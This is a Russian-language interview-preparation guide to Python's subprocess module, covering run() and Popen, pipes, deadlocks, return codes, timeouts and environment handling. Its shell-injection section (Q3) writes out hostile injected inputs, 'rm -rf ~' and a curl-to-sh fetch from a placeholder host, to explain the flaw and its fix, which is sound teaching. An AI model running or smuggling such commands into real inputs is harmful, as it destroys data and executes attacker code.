# subprocess — подготовка к собеседованию

## Что это и зачем

`subprocess` — это стандартный модуль Python для **запуска внешних процессов** (отдельных программ операционной системы), управления их потоками ввода/вывода (`stdin`, `stdout`, `stderr`), получения кодов возврата и взаимодействия с ними. Он пришёл на замену устаревшим и небезопасным функциям `os.system()`, `os.popen()`, а также модулям `commands` и старому `popen2`.

Зачем он нужен на практике:

- Запустить системную утилиту (`git`, `ffmpeg`, `docker`, `ImageMagick`, `pg_dump`) и получить её вывод.
- Построить конвейер (pipe) между несколькими процессами, как в шелле: `cat file | grep error | wc -l`.
- Запустить долгоживущий фоновый процесс и общаться с ним по мере работы.
- Контролировать окружение (`env`), рабочий каталог (`cwd`), таймауты, коды возврата.

Главная философия модуля: **по умолчанию НЕ использовать шелл**. Аргументы передаются списком, а не одной строкой, что устраняет целый класс уязвимостей (shell injection) и неоднозначностей с экранированием.

Ключевая точка входа — функция `subprocess.run()` (рекомендуется с Python 3.5+). Под капотом она использует класс `Popen`, который даёт низкоуровневый контроль для сложных сценариев.

---

## Ключевые концепции

1. **`run()` vs `Popen`**
   - `run()` — высокоуровневая обёртка: запускает процесс, **блокирующе ждёт** его завершения и возвращает объект `CompletedProcess`. Подходит для 90% задач.
   - `Popen` — низкоуровневый класс: запускает процесс и **сразу возвращает управление**, не дожидаясь завершения. Нужен для фоновых процессов, конвейеров, неблокирующего взаимодействия.

2. **Список аргументов vs строка**
   - `["ls", "-l", "/tmp"]` — список (рекомендуется, безопасно, без шелла).
   - `"ls -l /tmp"` — строка (требует `shell=True`, опасно).
   - Когда `shell=False` (по умолчанию), первый элемент списка — это путь к исполняемому файлу, остальные — аргументы. Никакого парсинга шеллом не происходит.

3. **`shell=True` и его ОПАСНОСТЬ**
   - При `shell=True` команда передаётся системному шеллу (`/bin/sh -c "..."`), который интерпретирует метасимволы: `;`, `|`, `&&`, `$()`, `` ` ``, `>`, `<`, `*`.
   - Если в команду попадают **недоверенные данные** (ввод пользователя), это приводит к **shell injection** — выполнению произвольных команд злоумышленником.

4. **Потоки: stdin / stdout / stderr**
   - Каждый из них можно перенаправить: в `subprocess.PIPE` (канал, читаемый из Python), в открытый файл, в `subprocess.DEVNULL` (выбросить), в `subprocess.STDOUT` (только для stderr — объединить с stdout).

5. **`PIPE` и `communicate()`**
   - `PIPE` создаёт ОС-канал ограниченного размера (обычно 64 КБ на Linux).
   - `communicate()` безопасно пишет в stdin и одновременно читает stdout/stderr, избегая взаимоблокировки (deadlock).

6. **Коды возврата**
   - `returncode == 0` — успех (соглашение Unix).
   - `returncode != 0` — ошибка. Отрицательное значение `-N` означает, что процесс убит сигналом N (например, `-9` = SIGKILL).
   - `check=True` / `check_call` / `check_output` бросают `CalledProcessError`, если код возврата ненулевой.

7. **`text` / `encoding`**
   - По умолчанию потоки работают в **байтах** (`bytes`). С `text=True` (или `encoding="utf-8"`) Python декодирует их в `str`.

8. **`capture_output`**
   - Сокращение для `stdout=PIPE, stderr=PIPE` (Python 3.7+).

9. **Таймауты**
   - Параметр `timeout` ограничивает время выполнения; при превышении бросается `TimeoutExpired`, но процесс при этом **не убивается автоматически** в случае `Popen.communicate()` — нужно вызвать `kill()` вручную.

---

## Основные функции/классы/методы

### `subprocess.run()` — основной способ

```python
import subprocess

# Простейший запуск: список аргументов, без шелла
result = subprocess.run(["ls", "-l", "/tmp"])
# result — объект CompletedProcess
print(result.returncode)  # 0 при успехе

# Захват вывода: capture_output=True эквивалентно stdout=PIPE, stderr=PIPE
result = subprocess.run(
    ["git", "rev-parse", "HEAD"],
    capture_output=True,  # перехватить stdout и stderr
    text=True,            # вернуть str вместо bytes (декодирование в текст)
    check=True,           # бросить CalledProcessError при ненулевом коде возврата
)
print("Хэш коммита:", result.stdout.strip())  # вывод как строка
print("Ошибки:", result.stderr)               # stderr тоже строка
```

Сигнатура (важные параметры):

```python
subprocess.run(
    args,                 # список аргументов (или строка при shell=True)
    *,
    stdin=None,           # источник для stdin: PIPE / файл / DEVNULL
    input=None,           # данные, которые будут поданы в stdin (str или bytes)
    stdout=None,          # куда направить stdout: PIPE / файл / DEVNULL
    stderr=None,          # куда направить stderr: PIPE / STDOUT / DEVNULL
    capture_output=False, # True => stdout=PIPE, stderr=PIPE
    shell=False,          # ОПАСНО при True — см. ниже
    cwd=None,             # рабочий каталог дочернего процесса
    timeout=None,         # таймаут в секундах
    check=False,          # True => CalledProcessError при returncode != 0
    encoding=None,        # кодировка; задание подразумевает text-режим
    errors=None,          # политика обработки ошибок декодирования
    text=None,            # True => текстовый режим (str)
    env=None,             # словарь переменных окружения
)
```

### `CompletedProcess` — результат `run()`

```python
import subprocess

cp = subprocess.run(["echo", "привет"], capture_output=True, text=True)
print(cp.args)        # ['echo', 'привет'] — переданные аргументы
print(cp.returncode)  # 0
print(cp.stdout)      # 'привет\n'
print(cp.stderr)      # '' (пусто)

# Удобный способ проверить успех постфактум:
cp.check_returncode()  # бросит CalledProcessError, если returncode != 0
```

### `check_output()` — получить вывод или исключение

```python
import subprocess

# Возвращает stdout. Бросает CalledProcessError при ненулевом коде возврата.
output = subprocess.check_output(["hostname"], text=True)
print("Хост:", output.strip())

# Объединение stderr в stdout, чтобы поймать диагностику в одном потоке
output = subprocess.check_output(
    ["python", "-c", "import sys; print('out'); print('err', file=sys.stderr)"],
    stderr=subprocess.STDOUT,  # stderr направляется в тот же поток, что и stdout
    text=True,
)
print(output)  # содержит и 'out', и 'err'
```

### `check_call()` — запустить и проверить код возврата (вывод не захватывается)

```python
import subprocess

# Возвращает 0 при успехе, иначе бросает CalledProcessError.
# Вывод идёт напрямую в терминал (не захватывается).
subprocess.check_call(["test", "-f", "/etc/hosts"])  # успех -> 0
```

### `subprocess.call()` — низкоуровневый аналог без исключения

```python
import subprocess

# Возвращает returncode (НЕ бросает исключение при ошибке).
rc = subprocess.call(["false"])  # утилита false всегда возвращает 1
print(rc)  # 1
```

### `Popen` — низкоуровневый контроль и фоновый запуск

```python
import subprocess

# Запускаем процесс и СРАЗУ продолжаем работу (не блокируемся).
proc = subprocess.Popen(
    ["sleep", "5"],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)
print("PID запущенного процесса:", proc.pid)

# Можно выполнять другую работу здесь...

# Дождаться завершения и забрать вывод БЕЗОПАСНО через communicate():
stdout, stderr = proc.communicate(timeout=10)
print("Код возврата:", proc.returncode)
```

### Конвейер (pipe) между процессами: `cat access.log | grep ERROR`

```python
import subprocess

# Первый процесс пишет в PIPE
p1 = subprocess.Popen(["cat", "access.log"], stdout=subprocess.PIPE)

# Второй процесс читает stdout первого как свой stdin
p2 = subprocess.Popen(
    ["grep", "ERROR"],
    stdin=p1.stdout,        # подключаем выход p1 ко входу p2
    stdout=subprocess.PIPE,
    text=True,
)

# ВАЖНО: закрыть наш конец p1.stdout, чтобы p1 получил SIGPIPE,
# если p2 завершится раньше. Иначе p1 может зависнуть.
p1.stdout.close()

output, _ = p2.communicate()
print(output)
```

### Передача данных в stdin через `input`

```python
import subprocess

# input передаёт данные в stdin процесса. Тип input должен совпадать с режимом:
# str при text=True, bytes — иначе.
result = subprocess.run(
    ["grep", "оши"],
    input="строка ок\nстрока с ошибкой\nещё ок\n",
    capture_output=True,
    text=True,
)
print(result.stdout)  # 'строка с ошибкой\n'
```

### Перенаправление в файл

```python
import subprocess

# Записать stdout процесса напрямую в файл (как редирект '>' в шелле)
with open("output.txt", "w", encoding="utf-8") as f:
    subprocess.run(["ls", "-la"], stdout=f, text=True)

# Подать содержимое файла на stdin (как редирект '<')
with open("input.txt", "r", encoding="utf-8") as f:
    subprocess.run(["sort"], stdin=f)

# Выбросить вывод в "никуда" (как '> /dev/null')
subprocess.run(["noisy_command"], stdout=subprocess.DEVNULL,
               stderr=subprocess.DEVNULL)
```

### Управление окружением (`env`) и рабочим каталогом (`cwd`)

```python
import os
import subprocess

# cwd — рабочий каталог дочернего процесса.
# env ПОЛНОСТЬЮ заменяет окружение (не дополняет!).
# Поэтому обычно копируют текущее окружение и модифицируют копию.
child_env = os.environ.copy()
child_env["LANG"] = "C"            # форсируем локаль
child_env["MY_TOKEN"] = "secret"   # добавляем свою переменную

subprocess.run(
    ["env"],
    cwd="/tmp",        # выполнить в каталоге /tmp
    env=child_env,     # передать модифицированное окружение
)
```

### Таймауты и `TimeoutExpired`

```python
import subprocess

try:
    result = subprocess.run(
        ["sleep", "10"],
        timeout=2,  # ждать не более 2 секунд
    )
except subprocess.TimeoutExpired as e:
    # run() при таймауте САМ убивает процесс и ждёт его (в отличие от Popen).
    print(f"Команда {e.cmd} превысила таймаут {e.timeout} c")

# Для Popen.communicate() при таймауте процесс НЕ убивается автоматически:
proc = subprocess.Popen(["sleep", "10"])
try:
    proc.communicate(timeout=2)
except subprocess.TimeoutExpired:
    proc.kill()              # убиваем сами
    proc.communicate()      # дочищаем буферы, дожидаемся завершения
```

---

## Частые вопросы на собеседовании

**Q1. В чём разница между `subprocess.run()` и `subprocess.Popen`?**

`run()` — высокоуровневая блокирующая функция: она запускает процесс, ждёт его завершения и возвращает `CompletedProcess` с собранными `stdout`, `stderr`, `returncode`. Это «всё в одном» для типовых задач.

`Popen` — низкоуровневый класс, который запускает процесс и **немедленно** возвращает управление, не дожидаясь окончания. Он нужен, когда процесс долгоживущий, когда требуется построить конвейер из нескольких процессов, читать вывод по мере поступления или работать неблокирующе. Фактически `run()` внутри использует `Popen` + `communicate()`.

---

**Q2. Почему рекомендуют передавать аргументы списком, а не строкой? Что плохого в `shell=True`?**

При `shell=False` (по умолчанию) и списке аргументов программа запускается напрямую через `os.execvp`-подобный механизм; никакой шелл не парсит строку, метасимволы (`;`, `|`, `$()`) трактуются как обычные символы. Это безопасно и предсказуемо: не нужно беспокоиться об экранировании пробелов, кавычек и т.п.

`shell=True` запускает `/bin/sh -c "<строка>"`, и шелл интерпретирует метасимволы. Если в строку попадает недоверенный ввод, это открывает **shell injection**. Кроме безопасности, `shell=True` ломает переносимость (Windows cmd vs sh), усложняет передачу аргументов с пробелами и делает поведение неочевидным.

---

**Q3. Покажите пример shell injection и безопасную альтернативу.**

Уязвимый код:

```python
import subprocess

# ОПАСНО: имя файла приходит от пользователя
filename = input("Введите имя файла: ")
# Если пользователь введёт:  report.txt; rm -rf ~
# то выполнится сначала cat, затем rm -rf ~ !!!
subprocess.run(f"cat {filename}", shell=True)
```

Атака: пользователь вводит `report.txt; rm -rf ~` или `$(curl evil.sh | sh)` — и шелл выполнит произвольные команды злоумышленника.

Безопасная альтернатива — список аргументов без шелла:

```python
import subprocess

filename = input("Введите имя файла: ")
# Безопасно: filename всегда трактуется как ОДИН аргумент,
# даже если содержит ';', пробелы или '$()'.
subprocess.run(["cat", filename])
```

Здесь `report.txt; rm -rf ~` будет воспринято как единственное (несуществующее) имя файла, и `cat` просто выдаст ошибку «нет такого файла». Никакая вторая команда не запустится.

---

**Q4. Что такое `communicate()` и зачем он нужен вместо `proc.stdout.read()` + `proc.wait()`?**

`communicate()` одновременно пишет данные в `stdin` процесса и читает `stdout`/`stderr`, используя внутри потоки/select, чтобы не возникало взаимоблокировки (deadlock). Каналы (PIPE) имеют ограниченный буфер ОС (~64 КБ). Если процесс наполнит буфер `stdout` и заблокируется в ожидании, что его прочитают, а ваш Python в это время блокируется на `proc.wait()` (ожидая завершения процесса) — оба зависнут навсегда. `communicate()` читает буферы параллельно, поэтому такой ситуации не возникает.

---

**Q5. Чем отличается `returncode != 0` от исключения? Что делает `check=True`?**

`returncode` — это просто число, возвращённое процессом. По умолчанию `run()` НЕ считает ненулевой код ошибкой и не бросает исключение — вы сами обязаны проверить `result.returncode`.

`check=True` (или функции `check_call` / `check_output`) меняет поведение: при ненулевом коде возврата бросается `CalledProcessError`, у которого есть атрибуты `returncode`, `cmd`, `output`/`stdout`, `stderr`. То есть: `returncode` — пассивный индикатор, а `check=True` — активная проверка с исключением.

```python
import subprocess
try:
    subprocess.run(["false"], check=True)
except subprocess.CalledProcessError as e:
    print("Код:", e.returncode)  # 1
```

---

**Q6. Что означает отрицательный `returncode`?**

На Unix отрицательное значение `-N` означает, что процесс был завершён сигналом с номером N. Например, `returncode == -9` означает SIGKILL (kill -9), `-15` — SIGTERM, `-11` — SIGSEGV (segfault). Положительные значения — это код выхода, который процесс вернул сам.

---

**Q7. Чем `text=True` отличается от поведения по умолчанию? Как задать кодировку?**

По умолчанию `subprocess` работает с **байтами**: `stdout`/`stderr` — это `bytes`, и `input` тоже должен быть `bytes`. С `text=True` (синоним `universal_newlines=True`) Python автоматически декодирует потоки в `str`, используя локальную кодировку, и нормализует переводы строк. Чтобы явно задать кодировку, используют `encoding="utf-8"` (это также включает текстовый режим). Параметр `errors` (например, `errors="replace"`) управляет реакцией на ошибки декодирования.

---

**Q8. Как объединить stderr с stdout в один поток?**

Передать `stderr=subprocess.STDOUT`. Тогда вывод ошибок попадёт в тот же канал, что и стандартный вывод — удобно, чтобы видеть полную картину в правильном временном порядке (например, при логировании сборки).

```python
import subprocess
out = subprocess.run(
    ["build_script.sh"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,  # stderr идёт в stdout
    text=True,
).stdout
```

---

**Q9. Как реализовать конвейер `a | b` правильно?**

Запустить `a` с `stdout=PIPE`, затем `b` с `stdin=a.stdout`. После запуска `b` обязательно вызвать `a.stdout.close()` в родительском процессе — чтобы родитель не держал лишнюю открытую копию канала и `a` корректно получил SIGPIPE, если `b` завершится. Завершить через `b.communicate()`. (Пример показан выше в секции методов.) В простых случаях можно даже воспользоваться `shell=True` с пайпом, но только если команда статична и не содержит пользовательского ввода.

---

**Q10. Как ограничить время выполнения команды? Что происходит при таймауте?**

Через параметр `timeout` (в секундах). У `run()`: при превышении бросается `TimeoutExpired`, причём `run()` сам убивает дочерний процесс и дожидается его завершения. У `Popen.communicate(timeout=...)`: бросается `TimeoutExpired`, но процесс НЕ убивается — нужно вручную вызвать `proc.kill()` и затем `proc.communicate()` для очистки. Важно: таймаут не гарантирует мгновенную остановку при `shell=True`, так как может остаться запущенный внутренний процесс-потомок шелла.

---

**Q11. Почему `os.system()` считается плохой практикой?**

`os.system()` всегда запускает команду через шелл (значит, уязвим к injection), возвращает «сырой» статус (его нужно разбирать через `os.waitstatus_to_exitcode`), не позволяет удобно захватывать вывод или передавать данные в stdin, плохо переносим и не даёт контроля над окружением и таймаутами. `subprocess` решает все эти проблемы и официально рекомендуется как замена.

---

**Q12. Что делает `capture_output=True` и с чем его нельзя сочетать?**

`capture_output=True` (Python 3.7+) — это сокращение для `stdout=subprocess.PIPE, stderr=subprocess.PIPE`. Его **нельзя** одновременно указывать вместе с явными `stdout` или `stderr` — будет `ValueError`. Если нужно объединить stderr в stdout, используйте `stdout=PIPE, stderr=STDOUT` вместо `capture_output`.

---

**Q13. Как безопасно передать в команду переменную окружения, не «потеряв» остальные?**

Параметр `env` **полностью заменяет** окружение дочернего процесса, а не дополняет. Поэтому правильный паттерн — скопировать текущее окружение и изменить копию: `env = os.environ.copy(); env["KEY"] = "val"`. Если просто передать `env={"KEY": "val"}`, дочерний процесс лишится `PATH`, `HOME` и пр., и многое сломается (например, исполняемый файл может не найтись).

---

**Q14. Как читать вывод процесса построчно в реальном времени (стриминг)?**

Использовать `Popen` с `stdout=PIPE` и `text=True`, затем итерироваться по `proc.stdout`:

```python
import subprocess

proc = subprocess.Popen(
    ["ping", "-c", "3", "8.8.8.8"],
    stdout=subprocess.PIPE,
    text=True,
    bufsize=1,  # построчная буферизация
)
for line in proc.stdout:          # читаем по мере появления строк
    print("LOG:", line.rstrip())
proc.wait()                       # дождаться завершения и забрать returncode
```

Важно: при этом следить за `stderr` отдельно (например, `stderr=STDOUT`), иначе при большом stderr возможен deadlock.

---

## Подводные камни (gotchas)

### 1. Deadlock при PIPE + `wait()` вместо `communicate()` на больших данных

Самая классическая ошибка. Буфер канала ОС ограничен (~64 КБ на Linux). Если процесс выводит много данных в `stdout=PIPE`, он заполнит буфер и **заблокируется**, ожидая, пока кто-то прочитает. Если в это время родитель вызвал `proc.wait()` (ждёт завершения, но не читает буфер) — взаимоблокировка: процесс ждёт чтения, родитель ждёт завершения процесса.

```python
import subprocess

# ОПАСНО — может зависнуть навсегда на большом выводе!
proc = subprocess.Popen(
    ["python", "-c", "print('x' * 10_000_000)"],
    stdout=subprocess.PIPE,
)
proc.wait()                 # <-- DEADLOCK: буфер полон, процесс ждёт чтения
data = proc.stdout.read()   # сюда мы уже не дойдём

# ПРАВИЛЬНО — communicate() читает буферы параллельно с ожиданием:
proc = subprocess.Popen(
    ["python", "-c", "print('x' * 10_000_000)"],
    stdout=subprocess.PIPE,
)
data, _ = proc.communicate()  # безопасно, без deadlock
```

То же касается ситуации, когда вы читаете только `stdout`, забыв про `stderr=PIPE`: если процесс много пишет в stderr, он зависнет. Решение — `communicate()` (читает оба) или `stderr=subprocess.STDOUT`.

### 2. Разница между `returncode` и исключением

По умолчанию `run()` НЕ бросает исключение при ненулевом коде возврата — ошибку легко проглядеть.

```python
import subprocess

# Никакого исключения не будет, даже если команда упала!
result = subprocess.run(["grep", "несуществующее", "/etc/hosts"])
# Нужно ЯВНО проверять:
if result.returncode != 0:
    print("Команда завершилась с ошибкой")

# Либо использовать check=True, чтобы получить CalledProcessError
```

Нюанс: некоторые утилиты используют ненулевой код в штатных ситуациях. Например, `grep` возвращает `1`, если совпадений не найдено (это не ошибка!). Поэтому `check=True` с `grep` нужно применять осознанно.

### 3. Почему не стоит использовать `os.system()`

`os.system("cmd")` всегда идёт через шелл (уязвимость к injection), возвращает закодированный статус вместо кода выхода, не даёт захватить вывод, передать stdin, выставить timeout, cwd, env. Это легаси-API. Везде, где встречаете `os.system` или `os.popen`, замена на `subprocess.run([...])` — это улучшение и по безопасности, и по контролю.

### 4. `shell=True` со списком аргументов

Если передать список **и** `shell=True`, на Unix первый элемент становится командой шелла, а остальные — позиционными параметрами `$0`, `$1`... (а не аргументами команды!). Это почти всегда не то, что нужно. Правило: `shell=True` → строка; `shell=False` → список.

### 5. `env` заменяет, а не дополняет окружение

Передача `env={"X": "1"}` лишает процесс `PATH` и прочих переменных. Всегда `os.environ.copy()` + модификация (см. Q13).

### 6. Несоответствие типов `input` и режима

В байтовом режиме (по умолчанию) `input` должен быть `bytes`; в текстовом (`text=True`) — `str`. Несоответствие даёт `TypeError`.

### 7. `TimeoutExpired` у `Popen` не убивает процесс

`run(timeout=...)` убивает процесс сам, а `Popen.communicate(timeout=...)` — нет. После `TimeoutExpired` нужно вручную `proc.kill()` + `proc.communicate()`, иначе останется зомби/висящий процесс.

### 8. Зависший дочерний процесс при `shell=True` и таймауте

`kill()` убивает сам шелл, но запущенные им внутренние процессы могут пережить родителя. Для надёжной зачистки используют группы процессов (`start_new_session=True` + `os.killpg`).

### 9. `FileNotFoundError` vs ненулевой код

Если исполняемого файла нет (при `shell=False`), бросается `FileNotFoundError` ещё на этапе запуска — это НЕ `CalledProcessError`. А при `shell=True` ту же ошибку вернёт сам шелл как ненулевой код возврата. Это разные ветки обработки.

---

## Лучшие практики

1. **По умолчанию используйте `subprocess.run()` со списком аргументов и `shell=False`.** Это безопасно и читаемо.
2. **Избегайте `shell=True`.** Если он действительно нужен (пайпы, glob, переменные шелла), НИКОГДА не подставляйте в строку недоверенный ввод. Для одиночных аргументов экранируйте через `shlex.quote()`.
3. **Используйте `check=True`** (или `check_call`/`check_output`), чтобы ошибки не проглатывались молча — fail fast.
4. **Всегда задавайте `timeout`** для команд, которые могут зависнуть, особенно при работе с сетью или внешними сервисами.
5. **Используйте `communicate()` (или `run()`)** вместо ручного `read()` + `wait()` — это устраняет deadlock на больших объёмах данных.
6. **Указывайте `text=True` и/или `encoding="utf-8"`**, если работаете со строками, чтобы не возиться с декодированием байтов вручную.
7. **Копируйте окружение** через `os.environ.copy()` перед модификацией `env`.
8. **Используйте `capture_output=True`** для лаконичного захвата вывода (Python 3.7+) или `stdout=PIPE, stderr=STDOUT` для объединения потоков.
9. **Логируйте `cmd`, `returncode`, `stderr`** при ошибках — это резко упрощает отладку.
10. **Для пайпов закрывайте родительский конец** (`p1.stdout.close()`), чтобы избежать висящих дескрипторов.
11. **Никогда не используйте `os.system()`** в новом коде.
12. **Передавайте абсолютные пути к исполняемым файлам** в чувствительных к безопасности контекстах, чтобы не зависеть от `PATH`.

---

## Шпаргалка

```python
import os
import subprocess

# --- Простой запуск ---
subprocess.run(["ls", "-l"])                              # запуск, ждать конца

# --- Захват вывода как текст + проверка ошибок ---
r = subprocess.run(["git", "status"], capture_output=True,
                   text=True, check=True)
print(r.stdout)

# --- Получить только stdout (или исключение) ---
out = subprocess.check_output(["whoami"], text=True)

# --- Только проверить код возврата ---
subprocess.check_call(["test", "-d", "/tmp"])

# --- Передать данные в stdin ---
subprocess.run(["grep", "foo"], input="foo\nbar\n",
               capture_output=True, text=True)

# --- Объединить stderr в stdout ---
subprocess.run(["cmd"], stdout=subprocess.PIPE,
               stderr=subprocess.STDOUT, text=True)

# --- Выбросить вывод ---
subprocess.run(["cmd"], stdout=subprocess.DEVNULL,
               stderr=subprocess.DEVNULL)

# --- Перенаправить в файл ---
with open("out.txt", "w") as f:
    subprocess.run(["ls"], stdout=f)

# --- Таймаут ---
try:
    subprocess.run(["sleep", "30"], timeout=5)
except subprocess.TimeoutExpired:
    pass

# --- Своё окружение и cwd ---
env = os.environ.copy(); env["LANG"] = "C"
subprocess.run(["env"], cwd="/tmp", env=env)

# --- Popen: фон + безопасный сбор вывода ---
p = subprocess.Popen(["long_task"], stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE, text=True)
out, err = p.communicate(timeout=60)   # безопасно от deadlock

# --- Пайп a | b ---
a = subprocess.Popen(["cat", "log.txt"], stdout=subprocess.PIPE)
b = subprocess.Popen(["grep", "ERR"], stdin=a.stdout,
                     stdout=subprocess.PIPE, text=True)
a.stdout.close()
print(b.communicate()[0])

# --- БЕЗОПАСНО vs ОПАСНО ---
subprocess.run(["cat", user_file])               # OK: список, без шелла
# subprocess.run(f"cat {user_file}", shell=True) # ОПАСНО: shell injection!

# --- Памятка по returncode ---
# 0           -> успех
# >0          -> код ошибки, который вернул сам процесс
# -N (Unix)   -> процесс убит сигналом N (-9=SIGKILL, -15=SIGTERM)
```

### Когда что использовать

| Задача | Инструмент |
|---|---|
| Запустить и подождать, проверить ошибку | `run(..., check=True)` |
| Получить вывод строкой | `run(..., capture_output=True, text=True)` или `check_output` |
| Только код возврата без захвата | `call` / `check_call` |
| Фоновый/долгий процесс, стриминг, пайпы | `Popen` + `communicate()` |
| Объединить stderr и stdout | `stderr=subprocess.STDOUT` |
| Спрятать вывод | `subprocess.DEVNULL` |
| Ограничить время | `timeout=...` + обработка `TimeoutExpired` |
